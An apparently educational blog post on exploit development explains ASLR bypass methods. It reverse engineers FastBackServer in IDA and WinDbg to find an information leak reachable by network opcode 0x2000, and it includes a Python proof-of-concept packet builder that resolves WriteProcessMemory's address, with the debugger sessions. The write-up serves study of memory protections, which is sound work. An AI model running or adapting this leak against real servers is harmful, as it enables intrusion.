---
title: "advanced memory protection bypasses, part 1: bypassing ASLR"
date: 2024-11-09T15:07:15-05:00
draft: false
toc: true
next: true
nomenu: false
notitle: false
---

## tl;dr

ROP (**Return Oriented Programming**) techniques made many stack buffer overflows exploitable, despite DEP (**Data Execution Prevention**), leading to the introduction of ASLR (**Address Space Layout Randomization**) as a countermeasure (that randomizes memory addresses). to bypass ASLR + DEP, you need three elements:

1. exploiting a logic flaw to bypass ASLR's randomization.

2. using ROP chains to work around DEP restrictions.

3. implementing dynamic shellcode encoding to handle "bad characters".

this post focuses on the first point.

## ASLR

[address space layout randomization (ASLR)](https://en.wikipedia.org/wiki/Address_space_layout_randomization) was first introduced to Windows with Vista and Server 2008, specifically to protect against memory corruption exploits. prior to these versions, Windows actually went to great lengths to maintain a consistent address space across processes and machines (making them more vulnerable to attacks).

ASLR works by randomizing the memory addresses used by executable code (EXEs and DLLs) to make it more difficult for attackers to predict where specific processes or functions will be located in memory. this randomization applies to the base of the executable, the positions of the stack, the heap locations, and the library positions.

### implementation

ASLR implementation in Windows starts at the compiler level. during compilation, executables are assigned a preferred base address (like `0x10000000`) that determines their default loading location in memory. 

two key compiler flags control address loading behaviour:

1. `/REBASE`: allows the OS to load modules at alternate addresses to avoid collisions.

2. `/DYNAMICBASE`: enables ASLR protection. this is enabled by default in Visual Studio, but in some cases needs to be manually set.

ASLR operates in two phases. at system boot, native DLLs used by `SYSTEM` processes are loaded at randomized addresses that remain static until reboot. then, when an application launches, all its ASLR-enabled components (EXEs and DLLs) are allocated random addresses (though system DLLs retain their boot-time addresses).

it's important to note that ASLR only randomizes 8 bits of the base address on 32-bit systems (i.e. less **entropy**). in 64-bit systems, ASLR can randomize 17-19 bits of the address (i.e. more **entropy**). this significantly increases the number of possible base addresses and makes attacks much harder.

the image below shows how a 32-bit x86 memory address is broken down. only some of these broken down components can be easily randomized at runtime.

![memory addresses are divided into components](/32bitentropy.png)

### bypass overview

#### exploiting non-ASLR modules

ASLR can be bypassed through four techniques. the first, and simplest, approach exploits modules compiled without ASLR protection (i.e. without the `/DYNAMICBASE` flag), which load at predictable addresses. these modules can provide gadgets for ROP chains to bypass DEP.

in security products that inject unprotected DLLs into protected processes, this can weaken the entire application's security posture. using the `Narly` plugin in WinDbg, you can identify modules' ASLR status through their PE headers' `DllCharacteristics` field.

```shell
0:006> .load narly
...
0:006> !nmod
00850000 0088f000 notepad /SafeSEH ON /GS *ASLR *DEP
C:\Windows\system32\notepad.exe
674a0000 674f6000 oleacc /SafeSEH ON /GS *ASLR *DEP
C:\Windows\System32\oleacc.dll
68e60000 68ed6000 efswrt /SafeSEH ON /GS *ASLR *DEP
C:\Windows\System32\efswrt.dll
69d70000 69ddc000 WINSPOOL /SafeSEH ON /GS *ASLR *DEP
C:\Windows\system32\WINSPOOL.DRV
6a600000 6a617000 MPR /SafeSEH ON /GS *ASLR *DEP
C:\Windows\System32\MPR.dll
6ba10000 6baf3000 MrmCoreR /SafeSEH ON /GS *ASLR *DEP
C:\Windows\System32\MrmCoreR.dll
6d3d0000 6d55c000 urlmon /SafeSEH ON /GS *ASLR *DEP
C:\Windows\system32\urlmon.dll
```

this output shows:

1. the memory address ranges (start and end) for each loaded module.

2. the module names.

3. security features enabled for each module: `/SafeSEH` for stack buffer overflow protection, `/GS` for stack cookie protection, `*ASLR` for ASLR, `*DEP` for DEP.

4. the full file path of each module.

summary: all modules in `notepad.exe` have ASLR enabled, which is typical for modern Windows apps.

#### leveraging low entropy

this technique relies on performing partial return address overwrites. it leverages the difference between the CPU's little-endian instruction reading and big-endian data storage.

for example, if a return address `0x7F801020` is stored as bytes `0x20`, `0x10`, `0x80`, `0x7F`, overwriting just the first two bytes (with values `0x11` and `0x22`), results in the CPU executing `0x7F801122`. if there's a `JMP ESP` instruction within the DLL the function belongs to, at address `0x7F801122`, the CPU would inadvertently execute the `JMP ESP` instruction. this could run our shellcode (in theory).

this sounds cool, but it's tricky to pull off. it requires targeting instructions within the same DLL, only allows for a single gadget execution, and needs the (rare) combination of ASLR-enabled + DEP-disabled targets.

#### brute-forcing base addresses

brute-forcing base addresses involves exploiting the limited 8-bit entropy in 32-bit Windows systems. this either requires applications that can survive invalid ROP gadget attempts or those that automatically restart after crashes. in a web server, for example, child process crashes often don't affect the parent server, sometimes allowing up to 256 attempts to guess the correct base address.

#### exploiting information leaks

this technique exploits logic vulnerabilities that expose memory addresses without providing direct code execution. modern exploits often chain multiple vulnerabilities: using an info-leak to bypass ASLR, then exploiting another vulnerability (e.g. buffer overflow) to achieve code execution through ROP chains. 

some vulnerabilities, like format string issues, can provide both information disclosure and code execution. 

### info leaks

#### identifying Win32 APIs

info leaks can arise from two primary sources: logical vulnerabilities or memory corruption. the latter must enable unauthorized memory reads, like [out-of-bounds stack access](https://book.hacktricks.xyz/binary-exploitation/stack-overflow).

let's reverse engineer the below application to see what we can find. you could either reverse engineer all valid opcodes within the `FXCLI_OraBR_Exec_Command` function, or just focus on Win32 APIs. the latter is faster.

some APIs are more interesting than others when you're trying to exploit them for info leaks:

- [`DebugHelp`](http://www.cplusplus.com/reference/cstdio/fopen/) from `Dbghelp.dll`: resolves function addresses from symbol names.

- [`CreateToolhelp32Snapshot`](http://www.cplusplus.com/reference/cstdio/fopen/).

- [`EnumProcessModules`](http://www.cplusplus.com/reference/cstdio/fopen/).

- C runtime APIs like [`fopen`](http://www.cplusplus.com/reference/cstdio/fopen/).


in IDA, you can scroll through the imported APIs (from the "Imports" tab). i found an API called [`SymGetSymFromName`](https://learn.microsoft.com/en-us/windows/win32/api/dbghelp/nf-dbghelp-symgetsymfromname). a quick google search reveals that this can be used to resolve the memory address of any exported Win32 API by supplying its name.

you can view its entry inside the `.idata` section to get more information.

```c
BOOL __stdcall SymGetSymFromName(HANDLE hProcess, PCSTR Name, PIMAGEHLP_SYMBOL Symbol)
    extrn __imp_SymGetSymFromName@12:dword
```

next, cross-reference the API to see where else it's referenced. in this case, it's used only once in the code [you can jump to the basic block where the API is invoked].

```asm
0000000000057E946 call    ds:__imp_SymSetOptions@4      ; SymSetOptions(x)
0000000000057E94C push    1                             ; fInvadeProcess
0000000000057E94E push    0                             ; UserSearchPath
0000000000057E950 call    ds:__imp_GetCurrentProcess@0  ; GetCurrentProcess()
0000000000057E956 push    eax                           ; hProcess
0000000000057E957 call    ds:__imp_SymInitialize@12     ; SymInitialize(x,x,x)
0000000000057E95D mov     [ebp+var_68C], eax
0000000000057E963 mov     edx, [ebp+Symbol]
0000000000057E969 mov     dword ptr [edx], 400h
0000000000057E96F mov     eax, [ebp+Symbol]
0000000000057E975 push    eax                           ; Symbol
0000000000057E976 lea     ecx, [ebp+Name]
0000000000057E97C push    ecx                           ; Name
0000000000057E97D call    ds:__imp_GetCurrentProcess@0  ; GetCurrentProcess()
0000000000057E983 push    eax                           ; hProcess
0000000000057E984 call    ds:__imp_SymGetSymFromName@12 ; SymGetSymFromName(x,x,x)
0000000000057E98A mov     [ebp+var_68C], eax
0000000000057E990 cmp     [ebp+var_68C], 0
0000000000057E997 jz      loc_57F032
```

this shows a few things:

1. the initial setup with `SymSetOptions`.

2. push parameters for symbol lookup configuration: `fInvadeProcess=1`, `UserSearchPath=0`.

3. get current process handle via `GetCurrentProcess`.

4. initialize symbol handling with `SymInitialize`.

5. set up `Symbol` struct with size `0x400`.

6. prepare parameters: `Symbol`, `Name`, `Process Handle`.

7. call `SymGetSymFromName`.

8. store + check the result, with conditional jump based on success/failure.

#### reverse engineering

the goal here is to find a network-triggerable path to `SymGetSymFromName` through static analysis. we're going to start from our target API call and trace execution paths while examining specific function calls. 

![dispatch function](/api-graph.png)

the above graph view is a typical layout of a dispatch function that handles different commands. examining the start of the function (disassembly) reveals this.

```c
00000000057DB80
00000000057DB80
00000000057DB80 ; Attributes: bp-based frame
00000000057DB80
00000000057DB80 ; int __cdecl FXCLI_DebugDispatch(int, char *Str1, int)
00000000057DB80                 public _FXCLI_DebugDispatch
00000000057DB80 _FXCLI_DebugDispatch proc near
00000000057DB80
00000000057DB80 var_8E4        = dword ptr -8E4h
00000000057DB80 var_8E0        = byte ptr -8E0h
```

there's a repeated function address: `0x57DB80`. the attribute notes that it uses `bp-based frame`. the prototype shows `__cdecl` calling convention and the public symbol name is `_FXCLI_DebugDispatch`. when the procedure starts, two local variables are defined: `var_8E4` and `var_8E0`.

the target function here is the one that calls `SymGetSymFromName`.

```c
// At address 0x57DB80
int __cdecl FXCLI_DebugDispatch(int, char *Str1, int)
```

the `__cdecl` calling convention means the **caller cleans up the stack** (important).

cross-referencing `_FXCLI_DebugDispatch` shows that a single function calls it: `FXCLI_OraBR_Exec_Command`. we can confirm this by going through the assembly sequence.

```asm
loc_573807:
lea     edx, [ebp+var_C36C]    ; Prepare third parameter
push    edx                     ; int parameter
lea     eax, [ebp+Dst]         ; Load string buffer address
push    eax                     ; char *Str1 parameter
mov     ecx, _FXCLI_pcFileBuffer ; Get file buffer
push    ecx                     ; First int parameter
call    _FXCLI_DebugDispatch   ; Our target function
```

now we have to find which opcode triggers the correct code path. moving up a block shows this.

```asm
cmp     [ebp+var_61B30], 2000h  ; Check for opcode 0x2000
jz      loc_573807              ; If match, call DebugDispatch
```

the opcode **`0x2000`** triggers the desired execution path.

writing a PoC for this that constructs a carefully crafted network packet should be pretty straightforward.

1. construct the command structure with proper padding + target opcode.

2. define three memory copy operations to be processed by the server.

3. provide actual data to be copied.

4. add required protocol checksum.

5. send crafted packet to port.

6. check confirmation in WinDbg.

```python
import socket
import sys
from struct import pack

# Initial command structure
buf = bytearray([0x41]*0xC)      # 12 bytes of padding for psAgentCommand
# Core command parameters
buf += pack("<i", 0x2000)        # Our target opcode (little-endian)
# Three memcpy operation specifications
buf += pack("<i", 0x0)           # First copy: source offset
buf += pack("<i", 0x100)         # First copy: size (256 bytes)
buf += pack("<i", 0x100)         # Second copy: source offset
buf += pack("<i", 0x100)         # Second copy: size
buf += pack("<i", 0x200)         # Third copy: source offset
buf += pack("<i", 0x100)         # Third copy: size
buf += bytearray([0x41]*0x8)     # Additional structure padding

# Payload data for memcpy operations
buf += b"A" * 0x100             # First block of data (256 'A's)
buf += b"B" * 0x100             # Second block (256 'B's)
buf += b"C" * 0x100             # Third block (256 'C's)

# Protocol required checksum
buf = pack(">i", len(buf)-4) + buf  # Big-endian length prefix

def main():
    if len(sys.argv) != 2:
        print("usage: %s <ip_address>\n" % (sys.argv[0]))
        sys.exit(1)

    server = sys.argv[1]
    port = 11460

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))

    s.send(buf)
    s.close()

    print("[+] packet sent! [+]")
    sys.exit(0)

if_name == "__main__":
    main()
```

launching the PoC and checking the output.

```shell
Breakpoint 0 hit
eax=0609c8f0 ebx=0609c418 ecx=00002000 edx=00000001 esi=0609c418 edi=00669360
eip=0056d1ef esp=0d47e334 ebp=0d4dfe98 iopl=0 nv up ei pl nz ac po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000212

0056d1ef 81bdd0e4f9ff00200000 cmp dword ptr [ebp-61B30h],2000h
ss:0023:0d47e368=00002000       # Our opcode is in place
```

this confirms that we can reach `FXCLI_DebugDispatch` with opcode `0x2000`. 

viewing the entire debugging session:

```shell
eax=0d4d3b30 ebx=0609c418 ecx=018e43a8 edx=0d4d3b2c esi=0609c418 edi=00669360
eip=0057381c esp=0d47e328 ebp=0d4dfe98 iopl=0 nv up ei pl zr na pe nc cs=001b
ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246
FastBackServer!FXCLI_OraBR_Exec_Command+0x7366:
0057381c e85fa30000 call FastBackServer!FXCLI_DebugDispatch (0057db80)
0:006> dd esp L3
0d47e328 018e43a8 0d4d3b30 0d4d3b2c
0:006> dd 0d4d3b30
0d4d3b30 41414141 41414141 41414141 41414141
0d4d3b40 41414141 41414141 41414141 41414141
0d4d3b50 41414141 41414141 41414141 41414141
0d4d3b60 41414141 41414141 41414141 41414141
0d4d3b70 41414141 41414141 41414141 41414141
0d4d3b80 41414141 41414141 41414141 41414141
0d4d3b90 41414141 41414141 41414141 41414141
0d4d3ba0 41414141 41414141 41414141 41414141
```

let's check it out step by step.

first, the state is registered at the call.

```shell
eax=0d4d3b30 ebx=0609c418 ecx=018e43a8 edx=0d4d3b2c 
esi=0609c418 edi=00669360
eip=0057381c esp=0d47e328 ebp=0d4dfe98
```

the instruction pointer (EIP) is about to execute the following.

```shell
call FastBackServer!FXCLI_DebugDispatch (0057db80)
```

check out the three function arguments.

```shell
0:006> dd esp L3
0d47e328 018e43a8 0d4d3b30 0d4d3b2c
```

1. `018e43a8`: `FXCLI_pcFileBuffer`.

2. `0d4d3b30`: points to our controlled buffer.

3. `0d4d3b2c`: another pointer.

verifying the contents of the buffer:

```shell
0d4d3b30 41414141 41414141 41414141 41414141
0d4d3b40 41414141 41414141 41414141 41414141
0d4d3b50 41414141 41414141 41414141 41414141
0d4d3b60 41414141 41414141 41414141 41414141
0d4d3b70 41414141 41414141 41414141 41414141
0d4d3b80 41414141 41414141 41414141 41414141
0d4d3b90 41414141 41414141 41414141 41414141
0d4d3ba0 41414141 41414141 41414141 41414141
```

the second argument does point to our controlled buffer, which contains a repeating `0x41` ("A") pattern. 

#### resolving addresses

if you recall the graph view of the dispatch function `FXCLI_DebugDispatch`, there were many branching statements, which are the result of `if`/`else` statements in C.

checking out the first basic block, we can break it down to see what's happening under the hood.

```asm
00000000057DB80 push    ebp                    ; Standard prologue
00000000057DB81 mov     ebp, esp
00000000057DB83 sub     esp, 8E4h              ; Large stack frame (0x8E4 bytes)
00000000057DB89 mov     [ebp+var_8], 100000h   ; Initialize variables
00000000057DB90 mov     [ebp+var_4], 0
```

this bit sets up the function and defines the size of the stack frame (`0x8E4` bytes).

the function then implements a series of command checks via string comparisons. the first one is the "help" check.

```asm
00000000057DB97 push    offset $SG111228       ; Push "help" string
00000000057DB9C call    _ml_strbytelen         ; Get length
00000000057DBA1 add     esp, 4                 ; Clean stack
00000000057DBA4 push    eax                    ; Push length as MaxCount
00000000057DBA5 push    offset $SG111229_1     ; Push "help" again
00000000057DBAA mov     eax, [ebp+Str1]        ; Get user input
00000000057DBAD push    eax                    ; Push as comparison string
00000000057DBAE call    _ml_strnicmp           ; Compare strings
00000000057DBB3 add     esp, 0Ch               ; Clean stack
00000000057DBB6 test    eax, eax               ; Check result
00000000057DBB8 jnz     loc_57DDBB             ; Branch if no match
```

if the argument string is `help`, `_ml_strbytelen` will return the value `4`. `_ml_strnicmp` (a wrapper around [`strnicmp`](https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/strnicmp-wcsnicmp-mbsnicmp-strnicmp-l-wcsnicmp-l-mbsnicmp-l?view=msvc-170)) will then compare `help` with the contents at the memory address in `Str1`. 

examining the API's arguments closely:

```shell
eax=0d4d3b30 ebx=0609c418 ecx=0085dbe4 edx=7efefeff esi=0609c418 edi=00669360
eip=0057dbae esp=0d47da30 ebp=0d47e320 iopl=0 nv up ei pl nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206
FastBackServer!FXCLI_DebugDispatch+0x2e:
0057dbae e8c4d40d00 call FastBackServer!ml_strnicmp (0065b077)
0:006> dd esp L3
0d47da30 0d4d3b30 0085dbec 00000004
0:006> da 0085dbec
0085dbec "help"
0:006> da 0d4d3b30
0d4d3b30 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d4d3b50 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d4d3b70 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d4d3b90 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d4d3bb0 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d4d3bd0 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d4d3bf0 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d4d3c10 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d4d3c30 ""
```

the initial function state at entry is at the top, but let's look at the argument analysis for `ml_strnicmp`.

```shell
0:006> dd esp L3
0d47da30 0d4d3b30 0085dbec 00000004
```

- `0d4d3b30`: points to the input buffer.

- `0085dbec`: points to the string "help".

- `00000004`: `MaxCount` from `ml_strbytelen`.


it then verifies the string contents.

```shell
0:006> da 0085dbec
0085dbec "help"            ; Reference string

0:006> da 0d4d3b30        ; Our controlled buffer
0d4d3b30 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d4d3b50 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d4d3b70 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
...
0d4d3c30 ""
```

the return value is analyzed.

```shell
0:006> r eax
eax=ffffffff              ; Non-zero means strings don't match
0:006> p
eax=ffffffff ebx=0609c418 ecx=ffffffff edx=0d4d2030 esi=0609c418 edi=00669360
eip=0057dbb6
```

so, the maximum size argument has the value `4`, and the dynamic string comes from `psCommandBuffer` (which we now own).

a non-zero value is returned by the API, in the output.

```shell
0:006> r eax
eax=ffffffff
0:006> p
eax=ffffffff ebx=0609c418 ecx=ffffffff edx=0d4d2030 esi=0609c418 edi=00669360
eip=0057dbb6 esp=0d47da3c ebp=0d47e320 iopl=0 nv up ei pl nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206
FastBackServer!FXCLI_DebugDispatch+0x36:
0057dbb6 85c0 test eax,eax

0:006> p
eax=ffffffff ebx=0609c418 ecx=ffffffff edx=0d4d2030 esi=0609c418 edi=00669360
eip=0057dbb8 esp=0d47da3c ebp=0d47e320 iopl=0 nv up ei ng nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000286
FastBackServer!FXCLI_DebugDispatch+0x38:
0057dbb8 0f85fd010000 jne FastBackServer!FXCLI_DebugDispatch+0x23b (0057ddbb)
[br=1]
```

this bit shows that the return value was used in a `test`, with a `jne`. since the return value is non-zero, the jump is executed.

```shell
0057dbb6 85c0             test    eax,eax
0:006> p
eip=0057dbb8             ; Next instruction
0:006> p
0057dbb8 0f85fd010000    jne     FastBackServer!FXCLI_DebugDispatch+0x23b (0057ddbb)
[br=1]                   ; Branch taken due to non-zero eax
```

the next two string comparisons (`DumpMemoryPools`, `ReadRepositorySectors`) are in the graph below. these assembly blocks can be translated into a series of branch statements. when each comparison is successful, the `FastBackServer` internal function is invoked.

![string comparison graph](/string-comp.png)

the block just before the `SymGetSymFromName` call performs a comparison as well.

```asm
loc_57E833:
push    offset $SG114411_0     ; "SymbolOperation"
call    _ml_strbytelen         ; Get length
add     esp, 4
push    eax                    ; MaxCount
push    offset $SG114412_0     ; "SymbolOperation"
mov     edx, [ebp+Str1]        ; User input
push    edx
call    _ml_strnicmp
add     esp, 0Ch
test    eax, eax               ; Check match
jnz     loc_57F054             ; Branch if no match
mov     [ebp+var_690], 0       ; Success path
```

`SymbolOperation` is the trigger string here, meaning we can pass the comparison by updating the PoC from earlier.

```python
# Basic structure to reach SymbolOperation handler
buf = bytearray([0x41]*0xC)    # Initial padding
buf += pack("<i", 0x2000)      # Target opcode
buf += pack("<i", 0x0)         # First memcpy offset
buf += pack("<i", 0x100)       # First memcpy size
buf += pack("<i", 0x100)       # Second memcpy offset
buf += pack("<i", 0x100)       # Second memcpy size
buf += pack("<i", 0x200)       # Third memcpy offset
buf += pack("<i", 0x100)       # Third memcpy size
buf += bytearray([0x41]*0x8)   # Additional padding

# Command buffer with "SymbolOperation"
buf += b"SymbolOperation"
buf += b"A" * (0x100 - len("SymbolOperation"))
buf += b"B" * 0x100
buf += b"C" * 0x100
```

setting a breakpoint on the `strnicmp`, executing the PoC will hit it.

```shell
0:001> bp 0057e84a       ; Set breakpoint on strnicmp
0:001> g
Breakpoint 0 hit
eax=0000000f ebx=0602bd30 ecx=0085e930 edx=0d563b30 esi=0602bd30 edi=00669360
eip=0057e84a

0:001> da poi(esp)       ; Examine first argument
0d563b30 "SymbolOperationAAAAAAAAAAAAAAAAA"
0d563b50 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d563b70 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d563b90 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d563bb0 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d563bd0 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d563bf0 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d563c10 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d563c30 ""
0:001> p
eax=00000000 ebx=0602bd30 ecx=00000000 edx=0d562030 esi=0602bd30 edi=00669360
eip=0057e84f esp=0d50da30 ebp=0d50e320 iopl=0 nv up ei pl nz ac pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
FastBackServer!FXCLI_DebugDispatch+0xccf:
0057e84f 83c40c add esp,0Ch
0:001> r eax
eax=00000000
```

including the correct string means we'll pass the test and take the code path leading to the `SymGetSymFromName` call. setting a breakpoint on this call (at `0x57E984`):

```shell
0:001> bp 0057e984
0:001> g
B r e a k po int 1 h i t
eax=ffffffff ebx=0602bd30 ecx=0d50da8c edx=0d50dca0 esi=0602bd30 edi=00669360
eip=0057e984 esp=0d50da30 ebp=0d50e320 iopl=0 nv up ei ng nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000286
FastBackServer!FXCLI_DebugDispatch+0xe04:
0057e984 ff15e4e76700 call dword ptr [FastBackServer!_imp SymGetSymFromName
(0067e7e4)] ds:0023:0067e7e4={dbghelp!SymGetSymFromName (6dbfea10)}
```

we can reach the call to `SymGetSymFromName`! now we need to resolve an address.

you can learn more about the prototype [here](https://learn.microsoft.com/en-us/windows/win32/api/dbghelp/nf-dbghelp-symgetsymfromname), but i'll share it below anyway.

```c
BOOL IMAGEAPI SymGetSymFromName(
HANDLE hProcess,
PCSTR Name,
PIMAGEHLP_SYMBOL Symbol
);
```

analyzing the arguments in WinDbg:

```shell
eax=ffffffff ebx=0602bd30 ecx=0d50da8c edx=0d50dca0 esi=0602bd30 edi=00669360
eip=0057e984 esp=0d50da30 ebp=0d50e320

0:079> dd esp L3         ; Examine all three arguments
0d50da30 <current_process_handle> 0d50da8c 0d50dca0

0:079> da poi(esp+4)     ; Second arg (symbol name)
0d50da8c "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
```

the second argument (`Name`) is our input string that was appended to the string `SymbolOperation`. so, i can provide the name of any Win32 API and have the address resolved by `SymGetSymFromName`!

the last argument, [`PIMAGEHLP_SYMBOL`](https://learn.microsoft.com/en-gb/windows/win32/api/dbghelp/ns-dbghelp-imagehlp_symbol), is a struct that looks like this:

```c
typedef struct _IMAGEHLP_SYMBOL {
    DWORD SizeOfStruct;    // Must be set correctly
    DWORD Address;         // Where the resolved address goes
    DWORD Size;
    DWORD Flags;
    DWORD MaxNameLength;
    CHAR Name[1];         // Symbol name
} IMAGEHLP_SYMBOL, *PIMAGEHLP_SYMBOL;
```

this struct is populated by `SymGetSymFromName` and initialized within the same block, at address `0x57E957`. the second field contains the resolved API's memory address, which can then be used to **bypass ASLR**.

we can update our PoC to house the name of the `WriteProcessMemory` API, that can be used to bypass DEP.

```python
# Modified psCommandBuffer to resolve WriteProcessMemory
symbol = b"SymbolOperationWriteProcessMemory" + b"\x00"  # Null-terminated string
buf += symbol + b"A" * (100 - len(symbol))               # Pad to 100 bytes
buf += b"B" * 0x100                                      # Additional padding
buf += b"C" * 0x100                                      # More padding
```

let's execute this and analyze the debugging results. the initial breakpoint is hit.

```shell
Breakpoint 0 hit
eax=ffffffff ebx=0608c418 ecx=0db5da8c edx=0db5dca0 esi=0608c418 edi=00669360
eip=0057e984 esp=0db5da30 ebp=0db5e320
```

getting ready to call `SymGetSymFromName`.

```shell
0057e984 ff15e4e76700    call dword ptr [FastBackServer!_imp_SymGetSymFromName]
```

verifying the arguments.

```shell
0:079> da poi(esp+4)     ; Examine second argument (symbol name)
0db5da8c "WriteProcessMemory"  ; Confirms our input reached here correctly
```

the input string `WriteProcessMemory` reached its destination!

we can dump the contents of the address field in the `PIMAGEHLP_SYMBOL` struct before calling the `SymGetSymFromName` API.

```shell
0:079> dd esp+8 L1       ; Get structure pointer
0db5da38 0db5dca0        ; Points to IMAGEHLP_SYMBOL structure

0:079> dds 0db5dca0+4 L1 ; Check Address field
0db5dca4 00000000        ; Initially zero - where API address will go
```

then execute the API call.

```shell
0:079> p                 ; Execute SymGetSymFromName
eax=00000001            ; Return value = TRUE (success)
ebx=0608c418 ecx=36be0505 edx=00020b40 esi=0608c418 edi=00669360
eip=0057e98a esp=0db5da3c ebp=0db5e320
```

the next instruction stores the return value.

```asm
0057e98a 898574f9ffff    mov dword ptr [ebp-68Ch], eax  ; Store return value
```

finally, the address will be returned when checked again.

```shell
0:079> dds 0db5dca0+4 L1             ; Check Address field again
0db5dca4 75342890 KERNEL32!WriteProcessMemoryStub  ; Success! We have the address
```

1. we successfully passed "WriteProcessMemory" to `SymGetSymFromName`.

2. the `IMAGEHLP_SYMBOL` struct properly initialized by setting the address to `0x00000000`.

3. the API call succeeded: `eax = 1`.

4. we got the real address of `WriteProcessMemory`: `0x75342890`.

#### collecting

the input triggers `SymGetSymFromName` via a network packet. going through the debug again, let's figure out which path is taken after getting the return value of `SymGetSymFromName`.

```shell
eax=00000001    ; SymGetSymFromName successful return
[...]
0057e990 83bd74f9ffff00 cmp [ebp-68Ch], 0    ; Check return
[branch not taken due to non-zero return]
```

checking out the string manipulations on output (handled by `sprintf`) in this block.

```asm
mov     edx, [ebp+Symbol]          ; Get symbol structure
mov     eax, [edx+4]              ; Get resolved address
push    eax                       ; Push as sprintf arg
push    offset "Address is: 0x%X \n"
mov     ecx, [ebp+arg_0]          ; Get output buffer
add     ecx, [ebp+var_4]          ; Adjust offset
push    ecx                       ; Push destination
call    _ml_sprintf               ; Format address string
```

the output of `sprintf` is stored on the stack at an offset from `EBP+arg_0`. to find out what `arg_0` is, we'll have to check out the variable declarations at the start of the `FXCLI_DebugDispatch` function.

```asm
00057DB80 var_10        = dword ptr -10h
00057DB80 var_C         = dword ptr -0Ch
00057DB80 var_8         = dword ptr -8
00057DB80 var_4         = dword ptr -4
00057DB80 arg_0         = dword ptr  8
00057DB80 Str1          = dword ptr  0Ch
00057DB80 arg_8         = dword ptr  10h
```

`arg_0` translated to "8", so you can dump the contents of `EBP+8` at the start.

```shell
0:077> dd ebp+8 L1
0db5e328 00ede3a8    ; Output buffer location
```

we can now view the contents of the buffer!

```shell
00ede3a8 "XpressServer: SymbolOperation..."
00ede3c8 "------------------------------..."
00ede3e8 "Value of [WriteProcessMemory] is"
00ede408 ": ..Address is: 0x75342890 .Flag"
00ede428 "s are: 0x207 .Size is : 0x20..."
```

at this point, the execution leads us to the end of the function where we return to `FXCLI_OraBR_Exec_Command` (@ `0x57381`) just after the call to `FXCLI_DebugDispatch`.

```asm
00573807 loc_573807:
00573807     lea     edx, [ebp+var_C36C]
0057380D     push    edx                 ; int
0057380E     lea     eax, [ebp+Dst]
00573814     push    eax                 ; Str1
00573815     mov     ecx, _FXCLI_pcFileBuffer
00573818     push    ecx                 ; int
0057381C     call    _FXCLI_DebugDispatch
00573821     add     esp, 0Ch
00573824     mov     [ebp+var_12524], eax
0057382A     cmp     [ebp+var_12524], 0
00573831     jz      short loc_57383F
```

i'll sum up the execution flow analysis at this point:

- return value = 1 -> success.

- compare @ `0x573831` isn't taken.

- execution flows through multiple paths, and all converge at the address below.

```asm
00575a62 cmp     [ebp-1251Ch], 0    ; Check status
00575a69 jz      loc_575B5B         ; Branch taken
```

stepping through the function, we reach another block.

```asm
00575B68 lea     ecx, [ebp+var_12550]
00575B6E push    ecx
00575B6F lea     edx, [ebp+var_61BC]
00575B75 push    edx
00575B76 mov     eax, [ebp+var_C370]
00575B7C mov     ecx, [eax+8]
00575B7F push    ecx
00575B80 call    FX_AGENT_S_GetConnectedIpPort
00575B85 add     esp, 0Ch
00575B88 mov     [ebp+var_61AC], eax
00575B8E cmp     [ebp+var_61AC], 0
00575B95 jnz     short loc_575C00
```

this seems to refer (call) to `FX_AGENT_S_GetConnectedIpPort`, meaning a network packet is involved. since the addresses in `ECX` and `EDX` come from an `LEA` instruction, it means the memory address stored in those registers is used to return the output of the invoked function.

```shell
eax=0608c8f0 ebx=0608c418 ecx=04fd0020 edx=0dbb9cdc esi=0608c418 edi=00669360
eip=00575b80 esp=0db5e328 ebp=0dbbfe98 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
FastBackServer!FXCLI_OraBR_Exec_Command+0x96ca:
00575b80 e85cc70000 call FastBackServer!FX_AGENT_S_GetConnectedIpPort
(005822e1)
0:077> dd ebp-12550 L1
0dbad948 00000000
0:077> dd ebp-61BC L1
0dbb9cdc 00000000
0:077> p
eax=00000001 ebx=0608c418 ecx=04fd0020 edx=8eb020d0 esi=0608c418 edi=00669360
eip=00575b85 esp=0db5e328 ebp=0dbbfe98 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
FastBackServer!FXCLI_OraBR_Exec_Command+0x96cf:
00575b85 83c40c add esp,0Ch
0:077> dd ebp-12550 L1
0dbad948 000020d0
0:077> dd ebp-61BC L1
0dbb9cdc 7877a8c0
```

